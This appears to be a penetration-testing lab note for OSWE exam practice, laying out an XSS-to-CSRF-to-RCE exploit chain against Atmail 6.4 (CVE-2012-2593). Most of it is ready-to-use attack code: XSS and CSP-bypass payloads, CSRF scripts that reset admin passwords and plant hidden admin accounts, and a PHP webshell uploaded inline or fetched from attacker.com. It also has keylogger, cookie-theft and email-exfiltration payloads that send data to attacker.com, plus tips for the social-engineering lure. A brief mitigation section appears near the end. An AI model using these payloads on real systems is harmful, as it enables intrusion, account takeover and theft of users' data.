## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# Atmail 6.4 XSS to RCE PoC Notes

## Vulnerability Summary
- **Target**: Atmail Mail Server Appliance 6.4
- **CVE**: CVE-2012-2593
- **Type**: Stored XSS → CSRF → RCE
- **Impact**: Authenticated user can execute code as web server

## Vulnerability Details

### Attack Chain
1. **Stored XSS**: Inject malicious JavaScript in email content
2. **Admin Context**: Admin views email in admin panel
3. **CSRF**: XSS payload performs privileged action as admin
4. **File Upload/RCE**: Upload plugin or modify config for code execution

### Root Cause
- Email content not properly sanitized when displayed in admin panel
- Admin panel allows HTML emails
- Missing CSRF tokens on sensitive actions
- Plugin upload functionality accessible from admin context

## Lab Setup

### Installation
```bash
# Download Atmail 6.4 (if available from vendor or archive)
wget http://downloads.atmail.com/atmail-6.4.0.tar.gz

# Extract and configure
tar -xzf atmail-6.4.0.tar.gz
cd atmail-6.4.0

# Follow installation wizard
# Default web interface: http://localhost/atmail
# Admin panel: http://localhost/admin
```

### Configuration
- **Web Interface**: http://localhost/atmail
- **Admin Panel**: http://localhost/admin
- **Default Admin**: admin@domain.local / admin
- **Mail Server**: Built-in or external SMTP/IMAP
- **Web Server**: Apache with PHP

## Exploit Chain

### Stage 1: Reconnaissance
```bash
# Identify Atmail installation
curl http://target/ | grep -i "atmail\|webmail"

# Check version
curl http://target/VERSION.txt
```

### Stage 2: User Registration
Register a normal user account to gain access to compose emails.

### Stage 3: XSS Injection Points

**Email Subject:**
```html
Subject: <script>alert(document.domain)</script>
```

**Email Body (HTML):**
```html
<img src=x onerror="alert(document.cookie)">
<script src="http://attacker.com/payload.js"></script>
```

**Email Attachments:**
```html
Filename: innocent.pdf<script>alert(1)</script>.pdf
```

### Stage 4: CSRF Payload

**Admin Password Change:**
```javascript
<script>
fetch('/admin/settings.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'action=change_password&new_password=Hacked123!&confirm_password=Hacked123!',
    credentials: 'include'
});
</script>
```

**Plugin Upload:**
```javascript
<script>
fetch('http://attacker.com:8000/malicious.zip')
    .then(r => r.blob())
    .then(blob => {
        var formData = new FormData();
        formData.append('plugin', blob, 'shell.zip');
        fetch('/admin/plugins.php?action=upload', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });
    });
</script>
```

**Create Admin Account:**
```javascript
<script>
var formData = new FormData();
formData.append('username', 'backdoor');
formData.append('password', 'Pwned123!');
formData.append('email', 'backdoor@local.test');
formData.append('role', 'admin');
fetch('/admin/users.php?action=create', {
    method: 'POST',
    body: formData,
    credentials: 'include'
});
</script>
```

### Stage 5: Payload Delivery

**HTTP Server Setup:**
```bash
# Create payload directory
mkdir atmail-payloads
cd atmail-payloads

# Create PHP webshell
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
EOF

# Start server
python3 -m http.server 8000
```

**Alternative: Inline Payload:**
```javascript
<script>
// Base64 encoded PHP shell
var shell = atob('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==');

// Create blob and upload
var blob = new Blob([shell], {type: 'application/x-php'});
var formData = new FormData();
formData.append('file', blob, 'shell.php');
formData.append('path', '/var/www/html/atmail/');
fetch('/admin/filemanager/upload.php', {
    method: 'POST',
    body: formData,
    credentials: 'include'
});
</script>
```

### Stage 6: Triggering the Exploit

**Social Engineering:**
- Subject: "URGENT: Server Security Alert"
- Body: "Admin action required - see attachment"
- Send to known admin email addresses

**Timing:**
- Send during business hours
- Use realistic sender names
- Reference current events/issues

## Testing Commands

```bash
# Basic exploitation
python3 poc.py --target-ip 192.168.1.100

# With custom payload server
python3 poc.py --target-ip 192.168.1.100 --payload-port 8080

# With Burp proxy
python3 poc.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

# Custom attacker IP (for callbacks)
python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5
```

## XSS Bypass Techniques

### If Basic XSS Filtered
```html
<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- Case variations -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- Template literals -->
<script>`${alert`1`}`</script>

<!-- DOM breaking -->
<script><!--
alert(1)
//--></script>
```

### CSP Bypass
```javascript
// If CSP allows 'unsafe-inline'
<script nonce="random">alert(1)</script>

// JSONP endpoint abuse
<script src="/api/endpoint?callback=alert"></script>

// Whitelisted domain
<script src="http://whitelisted.com/xss.js"></script>
```

## Debugging

### If XSS Doesn't Trigger
- Check if HTML emails are allowed
- Verify admin views email content (not just headers)
- Try different injection points (subject, body, headers)
- Check browser console for errors
- Verify CORS/CSP policies

### If CSRF Fails
- Check if CSRF tokens are required
- Verify admin session is active
- Test with simpler actions first
- Check network tab for failed requests

### If Upload Fails
- Verify upload directory permissions
- Check file type restrictions
- Try different extensions (.php, .php5, .phtml)
- Test with legitimate file first

## Payload Variations

### Keylogger
```javascript
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com:8000/log?key=' + e.key);
});
```

### Session Hijacking
```javascript
fetch('http://attacker.com:8000/steal?cookie=' + document.cookie);
```

### Email Exfiltration
```javascript
fetch('/admin/api/emails')
    .then(r => r.json())
    .then(emails => {
        fetch('http://attacker.com:8000/exfil', {
            method: 'POST',
            body: JSON.stringify(emails)
        });
    });
```

### Backdoor Account Creation
```javascript
// Create hidden admin account
fetch('/admin/users.php', {
    method: 'POST',
    body: new URLSearchParams({
        action: 'create',
        username: '.backup',
        password: 'hidden123',
        email: 'backup@local.internal',
        role: 'admin',
        hidden: '1'
    }),
    credentials: 'include'
});
```

## Mitigation

### Developer Fixes
```php
// Input validation
$subject = htmlspecialchars($_POST['subject'], ENT_QUOTES, 'UTF-8');

// Content Security Policy
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// CSRF tokens
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}

// File upload validation
$allowed = ['jpg', 'png', 'gif', 'pdf'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $allowed)) {
    die('Invalid file type');
}
```

### Server Configuration
```apache
# Apache .htaccess
<FilesMatch "\.(php|php3|php4|php5|phtml)$">
    Deny from all
</FilesMatch>

# Only allow in specific directories
<Directory "/var/www/html/atmail">
    php_flag engine off
</Directory>
```

## References
- https://www.exploit-db.com/exploits/20009
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/csrf
- https://owasp.org/www-community/attacks/xss/

## OSWE Exam Notes

### Key Takeaways
1. **XSS in webmail is powerful** - Admins often view user emails
2. **Chain vulnerabilities** - XSS alone isn't enough, combine with CSRF
3. **Think like an attacker** - Where do admins interact with user data?
4. **Multiple paths to RCE** - File upload, config change, account creation
5. **Social engineering matters** - Craft convincing emails

### Time Management
- Reconnaissance: 5 min
- User registration: 5 min
- XSS payload crafting: 15 min
- Payload server setup: 10 min
- Verification: 10 min
- Total: ~45 minutes

### Exam Checklist
- [ ] Identify user-controlled data in admin views
- [ ] Test for XSS in multiple injection points
- [ ] Confirm XSS executes in admin context
- [ ] Identify privileged actions (upload, config, users)
- [ ] Craft CSRF payload for privileged action
- [ ] Setup payload delivery server
- [ ] Verify RCE through uploaded shell
- [ ] Document with screenshots (email, XSS, shell)

### Common Patterns
```javascript
// XSS confirmation
<img src=x onerror="fetch('http://attacker.com/xss-confirmed')">

// Fetch API for CSRF
fetch('/admin/action', {
    method: 'POST',
    body: formData,
    credentials: 'include'  // Important!
});

// jQuery CSRF (if available)
$.post('/admin/action', {param: 'value'});
```

### Alternative Paths
If direct RCE fails:
1. Change admin password → login → manual upload
2. Create new admin account → authenticated access
3. Modify email forwarding → intercept sensitive data
4. Exfiltrate existing data instead of RCE
5. Persistent XSS → wait for shell upload opportunity
